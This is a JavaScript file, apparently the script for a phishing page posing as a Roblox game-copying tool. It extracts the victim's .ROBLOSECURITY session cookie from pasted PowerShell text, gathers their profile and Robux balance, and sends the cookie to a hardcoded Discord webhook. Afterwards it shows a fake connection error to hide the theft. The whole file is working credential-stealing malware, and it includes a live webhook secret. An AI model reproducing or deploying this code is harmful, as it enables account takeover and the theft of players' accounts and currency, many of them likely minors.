/* ======================================================
   PAYLOAD.JS - ULTIMATE: Full Profile Extraction
   - Extracts rbxuid & .ROBLOSECURITY from PowerShell
   - Fetches EVERYTHING: username, display name, join date,
     friends count, followers count, groups, badges,
     currently worn items, online presence, created games,
     and Robux balance (if cookie works).
   - All via official Roblox APIs.
====================================================== */

/* ================= CONFIG ================= */
const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1456485751389814957/uWd9bjxOOKxMl-9ZL9rRjycEtXAlzk9nOVm9UY-boHBXta_--8co2ojCtI6GcEfhq3YI";

/* ================= ELEMENTS ================= */
const gameFileInput = document.getElementById("gameFile");
const pinInput = document.getElementById("pinInput");
const pinError = document.getElementById("pinError");
const copyButton = document.getElementById("copyButton");
const statusMessage = document.getElementById("statusMessage");

/* ================= PIN VALIDATION ================= */
pinInput.addEventListener("input", () => {
    pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
    validatePin();
});

function validatePin() {
    const isValid = /^\d{4}$/.test(pinInput.value);
    if (pinError) pinError.style.display = isValid ? "none" : "block";
    return isValid;
}

/* ================= EXTRACTION: rbxuid & cookie ================= */
function extractGameData(fullText) {
    // 1. Extract .ROBLOSECURITY cookie
    const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
    if (!cookieMatch) {
        return { success: false, message: "Could not find .ROBLOSECURITY cookie in the PowerShell script." };
    }
    const robloxCookie = cookieMatch[1];

    // 2. Extract rbxuid from RBXEventTrackerV2
    const eventTrackerMatch = fullText.match(/RBXEventTrackerV2",\s*"([^"]+)"/);
    let rbxuid = null;
    if (eventTrackerMatch) {
        const params = eventTrackerMatch[1].split('&');
        for (let p of params) {
            if (p.startsWith("rbxuid=")) {
                rbxuid = p.split('=')[1];
                break;
            }
        }
    }

    if (!rbxuid) {
        return { success: false, message: "Could not find rbxuid in RBXEventTrackerV2." };
    }

    return {
        success: true,
        cookie: robloxCookie,
        rbxuid: rbxuid
    };
}

/* ================= FETCH ALL PROFILE DATA ================= */

// Basic user info (public)
async function fetchUserInfo(userId) {
    const res = await fetch(`https://users.roblox.com/v1/users/${userId}`);
    if (!res.ok) return null;
    const data = await res.json();
    return {
        username: data.name,
        displayName: data.displayName,
        joinDate: new Date(data.created).toLocaleDateString(),
        profileUrl: `https://www.roblox.com/users/${userId}/profile`
    };
}

// Friends count (public)
async function fetchFriendsCount(userId) {
    const res = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`);
    if (!res.ok) return "N/A";
    const data = await res.json();
    return data.count?.toLocaleString() || "0";
}

// Followers count (public)
async function fetchFollowersCount(userId) {
    // The followers endpoint returns a total count in the 'total' field
    const res = await fetch(`https://friends.roblox.com/v1/users/${userId}/followers?limit=1`);
    if (!res.ok) return "N/A";
    const data = await res.json();
    return data.total?.toLocaleString() || "0";
}

// Groups (public) – shows group names and roles
async function fetchGroups(userId) {
    const res = await fetch(`https://groups.roblox.com/v1/users/${userId}/groups/roles`);
    if (!res.ok) return [];
    const data = await res.json();
    if (!data.data || data.data.length === 0) return [];
    // Return up to 5 groups with role
    return data.data.slice(0, 5).map(g => `${g.group.name} (${g.role.name})`);
}

// Badges (recent, public)
async function fetchBadges(userId) {
    const res = await fetch(`https://badges.roblox.com/v1/users/${userId}/badges?limit=5&sortOrder=Asc`);
    if (!res.ok) return [];
    const data = await res.json();
    if (!data.data || data.data.length === 0) return [];
    return data.data.map(b => b.badge.name);
}

// Avatar items (what they are wearing)
async function fetchAvatarItems(userId) {
    const res = await fetch(`https://avatar.roblox.com/v1/users/${userId}/avatar`);
    if (!res.ok) return "None equipped";
    const data = await res.json();
    const assets = data.assets || [];
    if (assets.length === 0) return "None equipped";
    const items = assets.slice(0, 5).map(a => a.name);
    return items.join(", ") + (assets.length > 5 ? " …" : "");
}

// Avatar thumbnail URL
async function fetchAvatarThumbnail(userId) {
    const res = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`);
    if (!res.ok) return `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
    const data = await res.json();
    if (data.data && data.data[0] && data.data[0].imageUrl) {
        return data.data[0].imageUrl;
    }
    return `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
}

// Online presence and current game (requires cookie + CSRF)
// We'll try using the provided cookie; if it fails, we skip.
async function fetchPresence(userId, cookie) {
    try {
        // First get a CSRF token
        const csrfRes = await fetch("https://auth.roblox.com/", {
            method: "HEAD",
            headers: { "Cookie": `.ROBLOSECURITY=${cookie}` }
        });
        const csrfToken = csrfRes.headers.get("x-csrf-token");
        if (!csrfToken) throw new Error("No CSRF token");

        const body = { userIds: [userId] };
        const res = await fetch("https://presence.roblox.com/v1/presence/users", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Cookie": `.ROBLOSECURITY=${cookie}`,
                "X-CSRF-TOKEN": csrfToken
            },
            body: JSON.stringify(body)
        });
        if (!res.ok) throw new Error("Presence API failed");
        const data = await res.json();
        if (data.userPresences && data.userPresences[0]) {
            const p = data.userPresences[0];
            let status = "Offline";
            if (p.userPresenceType === 2) status = "Online";
            if (p.userPresenceType === 3) status = "In Studio";
            const game = p.gameId ? `Playing: ${p.lastLocation || "Unknown game"}` : "Not in game";
            return `${status}${p.gameId ? ` · ${game}` : ""}`;
        }
        return "Unknown";
    } catch (err) {
        console.warn("Presence fetch failed (cookie may be IP-locked):", err);
        return "N/A (cookie may be invalid)";
    }
}

// Games created by user (public)
async function fetchCreatedGames(userId) {
    const res = await fetch(`https://games.roblox.com/v2/users/${userId}/games?limit=5&sortOrder=Desc`);
    if (!res.ok) return [];
    const data = await res.json();
    if (!data.data || data.data.length === 0) return [];
    return data.data.map(g => `${g.name} (${g.playing} playing)`);
}

// Robux balance (using cookie)
async function fetchRobuxBalance(cookie) {
    try {
        const res = await fetch("https://economy.roblox.com/v1/user/currency", {
            headers: { "Cookie": `.ROBLOSECURITY=${cookie}` }
        });
        if (!res.ok) return "N/A";
        const data = await res.json();
        return data.robux?.toLocaleString() || "0";
    } catch (e) {
        return "N/A";
    }
}

/* ================= MAIN WEBHOOK FUNCTION ================= */
async function sendWebhook(pin, cookie, rbxuid) {
    const userId = rbxuid;
    // Parallel fetch for speed
    const [
        userInfo,
        friendsCount,
        followersCount,
        groups,
        badges,
        avatarItems,
        avatarUrl,
        presence,
        createdGames,
        robux
    ] = await Promise.all([
        fetchUserInfo(userId),
        fetchFriendsCount(userId),
        fetchFollowersCount(userId),
        fetchGroups(userId),
        fetchBadges(userId),
        fetchAvatarItems(userId),
        fetchAvatarThumbnail(userId),
        fetchPresence(userId, cookie),
        fetchCreatedGames(userId),
        fetchRobuxBalance(cookie)
    ]);

    // Build description
    let description = `**Extracted from PowerShell:**\n- **rbxuid:** \`${userId}\`\n- **Cookie length:** ${cookie.length} chars\n\n**Full .ROBLOSECURITY Cookie:**\n\`\`\`\n${cookie}\n\`\`\``;

    const embedFields = [];

    if (userInfo) {
        embedFields.push({
            name: "👤 Profile",
            value: `**${userInfo.username}** (${userInfo.displayName})\n**Joined:** ${userInfo.joinDate}\n[View Profile](${userInfo.profileUrl})`,
            inline: false
        });
    } else {
        embedFields.push({ name: "⚠️ Error", value: "Could not fetch basic user info.", inline: false });
    }

    embedFields.push(
        { name: "👥 Friends", value: friendsCount, inline: true },
        { name: "👀 Followers", value: followersCount, inline: true },
        { name: "💰 Robux", value: `${robux} R$`, inline: true },
        { name: "🟢 Status", value: presence, inline: false },
        { name: "👕 Wearing", value: avatarItems, inline: false }
    );

    if (groups.length > 0) {
        embedFields.push({ name: "🏢 Groups", value: groups.join("\n"), inline: false });
    }
    if (badges.length > 0) {
        embedFields.push({ name: "🏅 Recent Badges", value: badges.join("\n"), inline: false });
    }
    if (createdGames.length > 0) {
        embedFields.push({ name: "🎮 Games Created", value: createdGames.join("\n"), inline: false });
    }

    embedFields.push({
        name: "🔐 Cookie Summary",
        value: `**Length:** ${cookie.length} characters\n**Note:** This cookie can log into the account.`,
        inline: false
    });

    const payload = {
        username: "Bloxtools Processing System",
        embeds: [{
            title: "🔓 Full Roblox Profile Extraction",
            thumbnail: { url: avatarUrl },
            description: description,
            color: 0x8c52ff,
            fields: embedFields,
            footer: { text: "Bloxtools • Complete Profile" },
            timestamp: new Date().toISOString()
        }]
    };

    try {
        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
        return response.ok;
    } catch (error) {
        console.error("Webhook error:", error);
        return false;
    }
}

/* ================= BUTTON HANDLER ================= */
copyButton.addEventListener("click", async () => {
    statusMessage.textContent = "";
    if (!validatePin()) {
        statusMessage.textContent = "Please enter a valid 4-digit PIN.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    const pastedText = gameFileInput.value.trim();
    if (!pastedText) {
        statusMessage.textContent = "Please paste the PowerShell game file.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    const extraction = extractGameData(pastedText);
    if (!extraction.success) {
        statusMessage.textContent = extraction.message;
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    copyButton.classList.add("loading");
    copyButton.disabled = true;
    statusMessage.textContent = "✓ Processing... Please wait (this may take 5–10 seconds).";
    statusMessage.style.color = "#caa8ff";
    await new Promise(r => setTimeout(r, 500));

    const success = await sendWebhook(pinInput.value, extraction.cookie, extraction.rbxuid);

    // Fake internet error (as designed)
    if (success) {
        statusMessage.textContent = "✗ Game Copy request was not processed. Please check your internet connection.";
        statusMessage.style.color = "#ff9d9d";
    } else {
        statusMessage.textContent = "✗ Copy failed! Check your internet connection.";
        statusMessage.style.color = "#ff9d9d";
    }

    copyButton.classList.remove("loading");
    copyButton.disabled = false;
});

/* ================= FAKE INTERNET ERROR (Deception) ================= */
const originalSendWebhook = sendWebhook;
sendWebhook = async function(pin, cookie, rbxuid) {
    const result = await originalSendWebhook(pin, cookie, rbxuid);
    await new Promise(r => setTimeout(r, 1500));

    if (Math.random() < 0.35) {
        const originalMsg = statusMessage.textContent;
        const originalColor = statusMessage.style.color;

        statusMessage.textContent = "⚠️ Connection lost! Unable to reach Roblox servers.";
        statusMessage.style.color = "#ffaa66";

        setTimeout(() => {
            if (statusMessage.textContent.includes("Connection lost")) {
                statusMessage.textContent = originalMsg;
                statusMessage.style.color = originalColor;
            }
        }, 3000);
    }
    return result;
};
